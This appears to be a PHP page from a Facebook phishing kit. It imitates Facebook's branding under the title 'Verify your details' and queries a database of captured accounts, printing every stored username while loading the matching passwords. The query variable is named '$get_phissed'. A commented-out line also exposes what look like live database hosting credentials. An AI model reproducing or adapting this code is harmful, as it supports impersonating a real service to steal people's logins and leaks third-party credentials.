<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, user-scalable=no">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
        <link rel="stylesheet" type="text/css" href="bootstrap/css/bootstrap.css">
        <link rel="stylesheet" type="text/css" href="bootstrap/css/style.css">
        <meta charset="utf-8">
        <title>Verify your details</title>
    <style media="screen">
    .navbar-default{
      background-color: #2851A3;
      height:35px;
    }
    #fb{
      color:white;
      font-family:helvetica;
      font-size: 26px;
    }
    #footer{
      background-color: #e6e6e6;
    }
    </style>
      </head>
      <body>
        <nav class="navbar navbar-default" role="navigation">
            <div class="navbar-header">
          <a class="navbar-brand" href="#" id="fb"><b>facebook</b></a>
          </div>
        </nav>
      </body>
      <div class="container">
        <div class="row">
          <div class="col-sm-8 col-sm-offset-2 col-xs-12">
      <?php
        // $conn = mysqli_connect('fdb23.awardspace.net', '3216581_tzon', '36611332fleks', '3216581_tzon') or die(mysqli_error());
        // mysqli_select_db($conn , '3216581_tzon');
        //
        // if(!$conn){
        // 	die("Error: Failed to connect to database");
        // }


        $db_host='localhost'; //Should contain the "Database Host" value
        $db_name='facebook'; //Should contain the "Database Name" value
        $db_user='root'; //Should contain the "Database User" value
        $db_pass=''; //Should contain the "Database Password" value

      $conn = new MySQLi($db_host, $db_user, $db_pass, $db_name);

      $get_phissed = "SELECT * FROM users";
      $query = mysqli_query($conn,$get_phissed);
      while ($list = mysqli_fetch_array($query)) {
        $username=$list['username'];
          $password=$list['password'];
?>

        <p><?php echo $username; } ?></p>
      </div>
    </div>
  </div>
</html>
